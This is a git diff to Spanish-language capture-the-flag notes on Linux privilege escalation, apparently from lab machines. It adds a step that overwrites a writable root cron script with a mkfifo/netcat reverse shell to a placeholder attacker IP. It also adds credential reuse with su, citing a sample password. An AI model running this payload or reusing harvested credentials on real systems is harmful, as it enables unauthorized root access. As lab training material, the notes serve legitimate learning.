@@ -1,6 +1,6 @@
 # Escalada de privilegios Linux
 
-Técnicas usadas en **CACHOPO**, **ACEITUNO**, **Academia**, **GOIKO** y **BOLA**.
+Técnicas usadas en **CACHOPO**, **ACEITUNO**, **Academia**, **GOIKO**, **BOLA**, **Domino** y **Monitor silencioso**.
 
 ## 1. Punto de partida: enumeración
 
@@ -68,7 +68,37 @@ chmod +x pspy64
 
 Útil para descubrir un script periódico escribible.
 
-## 5. Hijack del PATH
+Si el script del cron es **writable por nuestro grupo** (en **Domino**: `-rwxrwxr-- root devops`), sobrescribirlo directamente con el payload y esperar a la siguiente ejecución:
+
+```
+# payload en /opt/monitoring/health_report.sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP_LOCAL> <PUERTO> >/tmp/f
+```
+
+Comprobar permisos antes de tocar nada:
+
+```
+ls -la /opt/monitoring/health_report.sh
+```
+
+## 5. Credenciales reutilizadas (`su`)
+
+Las contraseñas encontradas en ficheros de configuración o vaults suelen reutilizarse en otras cuentas del mismo sistema:
+
+```
+su <usuario>
+# contraseña encontrada en la configuración
+cat user.txt
+```
+
+Ejemplos del repo:
+
+- **Domino**: la contraseña de `config.php` (`D3v0ps!2024`) servía también para el usuario `devops`.
+- **Monitor silencioso**: password de `secret.config` → SSH como `sysadmin`; password del vault KeePass → `su root`.
+
+> Ojo: el usuario de un servicio web (`www-data`) normalmente **no** puede usar `su`; en ese caso reconéctate por SSH con esas credenciales.
+
+## 6. Hijack del PATH
 
 Si un script de `sudo` ejecuta un binario sin ruta absoluta (`find`, `ls`...), creamos uno falso en un directorio que controlamos:
 
@@ -84,7 +114,7 @@ Y ejecutamos el script forzando el PATH:
 sudo PATH=/ruta/controlada:$PATH /ruta/controlada/script.sh
 ```
 
-## 6. Bases de datos locales
+## 7. Bases de datos locales
 
 ```
 mysql -u <usuario> -p -h localhost <basededatos>
@@ -100,7 +130,7 @@ show tables;
 select * from <tabla>;
 ```
 
-## 7. Recoger las banderas
+## 8. Recoger las banderas
 
 ```
 cat user.txt
